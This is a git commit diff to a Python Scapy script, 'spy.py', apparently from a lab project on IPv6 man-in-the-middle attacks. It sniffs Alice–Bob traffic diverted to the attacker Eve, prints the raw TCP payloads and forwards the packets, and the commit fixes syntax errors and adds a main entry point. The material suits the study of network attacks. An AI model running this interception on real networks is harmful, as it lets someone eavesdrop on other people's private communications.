233b69e7793731002a89352dacd0c96d1d574a8a
SimchaTeich <sim.teich@gmail.com>
2022-08-19 14:47:05 +0300

    add main to spy

--- MITMv6/3 - Eve story/spy.py
+++ MITMv6/3 - Eve story/spy.py
@@ -13,26 +13,30 @@ BOB_IPv6 = "fe80::1eaa:7821:6306:2979"
 BOB_MAC = "08:00:27:ab:33:74"
 
 def printConversation(pkt):
-    if pkt[Ether].src = ALICE_MAC:
+    if pkt[Ether].src == ALICE_MAC:
         pkt[Ether].dst = BOB_MAC
     else:
         pkt[Ether].dst = ALICE_MAC
     
-    print(pkt.summary())
+    if TCP in pkt and Raw in pkt:
+        print(pkt[Raw])
     sendp(pkt, verbose=0)
 
 def AliceAndBobConnect(pkt):
-    return Ether in pkt and IPv6 in pkt and
-    ((pkt[Ether].src == ALICE_MAC and
-    pkt[Ether].dst == EVE_MAC and
-    pkt[IPv6].src == ALICE_IPv6 and
-    pkt[IPv6].dst == BOB_IPv6)
-    or
-    (pkt[Ether].src == BOB_MAC and
-    pkt[Ether].dst == EVE_MAC and
-    pkt[IPv6].src == BOB_IPv6 and
+    return Ether in pkt and IPv6 in pkt and\
+    ((pkt[Ether].src == ALICE_MAC and\
+    pkt[Ether].dst == EVE_MAC and\
+    pkt[IPv6].src == ALICE_IPv6 and\
+    pkt[IPv6].dst == BOB_IPv6)\
+    or\
+    (pkt[Ether].src == BOB_MAC and\
+    pkt[Ether].dst == EVE_MAC and\
+    pkt[IPv6].src == BOB_IPv6 and\
     pkt[IPv6].dst == ALICE_IPv6))
 
 
 def main():
     sniff(lfilter=AliceAndBobConnect, prn=printConversation)
+    
+if __name__ == "__main__":
+    main()
